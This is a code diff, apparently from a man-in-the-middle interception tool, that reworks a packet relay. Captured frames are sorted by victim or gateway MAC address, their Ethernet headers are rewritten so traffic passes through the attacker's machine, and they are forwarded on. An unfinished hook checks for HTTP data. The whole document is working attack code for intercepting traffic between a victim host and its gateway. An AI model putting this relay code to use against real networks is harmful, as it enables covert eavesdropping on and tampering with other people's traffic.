@@ -61,21 +61,45 @@ void Pipe::relay(u_char* args, const struct pcap_pkthdr* header, const unsigned 
 	if(!memcmp(Globals::attacker.mac, ether->thaddr, 6)){
 		Packet* rcvdPacket = new Packet(packet, header->len);
 
-		IP* ip = (IP*) (packet + 14);
-		if(ip->src == Globals::victim.ip){
+		// Adding packets to the victim queue (send them to the gateway)
+		if(!memcmp(ether->shaddr, Globals::victim.mac->ether_addr_octet, 6)){
 			pthread_mutex_lock(&victimMutex);
 			victimBuffer.push(*rcvdPacket);
 			pthread_mutex_unlock(&victimMutex);
 
-		} else if(ip->src == Globals::gateway.ip){
+		} else if(!memcmp(ether->shaddr, Globals::gateway.mac->ether_addr_octet, 6)){
 			pthread_mutex_lock(&gatewayMutex);
 			gatewayBuffer.push(*rcvdPacket);
 			pthread_mutex_unlock(&gatewayMutex);
+
+			if(!isHTTPData(*rcvdPacket)){
+				pthread_mutex_lock(&renderMutex);
+
+				pthread_mutex_unlock(&renderMutex);
+			}
 		}
 	}
 }
 
 void* Pipe::routeToVictim(void* args){
+	while(1 == 1){
+		if(!gatewayBuffer.empty()){
+			pthread_mutex_lock(&gatewayMutex);
+			Packet packet = gatewayBuffer.front();
+			gatewayBuffer.pop();
+			pthread_mutex_unlock(&gatewayMutex);
+
+			Ethernet* ether = (Ethernet*) packet.data;
+			memcpy(ether->shaddr, Globals::attacker.mac->ether_addr_octet, 6);
+			memcpy(ether->thaddr, Globals::victim.mac->ether_addr_octet, 6);
+
+			printf("Packet: %d bytes    attacker  ->  victim\n", packet.len);
+			gatewayCrafter.sendRaw(packet);
+		}
+	}
+}
+
+void* Pipe::routeToGateway(void* args){
 	while(1 == 1){
 		if(!victimBuffer.empty()){
 			pthread_mutex_lock(&victimMutex);
@@ -85,28 +109,10 @@ void* Pipe::routeToVictim(void* args){
 
 			Ethernet* ether = (Ethernet*) packet.data;
 			memcpy(ether->shaddr, Globals::attacker.mac->ether_addr_octet, 6);
-			memcpy(ether->thaddr, Globals::victim.mac->ether_addr_octet, 6);
-
-			printf("Packet: %d bytes    attacker  ->  victim\n", packet.len);
-			victimCrafter.sendRaw(packet);
-		}
-	}
-}
-
-void* Pipe::routeToGateway(void* args){
-	while(1 == 1){
-		if(!victimBuffer.empty()){
-			pthread_mutex_lock(&gatewayMutex);
-			Packet packet = gatewayBuffer.front();
-			gatewayBuffer.pop();
-			pthread_mutex_unlock(&gatewayMutex);
-
-			Ethernet* ether = (Ethernet*) packet.data;
-			memcpy(ether->shaddr, Globals::attacker.mac->ether_addr_octet, 6);
 			memcpy(ether->thaddr, Globals::gateway.mac->ether_addr_octet, 6);
 
 			printf("Packet: %d bytes    attacker  ->  gateway\n", packet.len);
-			gatewayCrafter.sendRaw(packet);
+			victimCrafter.sendRaw(packet);
 		}
 	}
 }
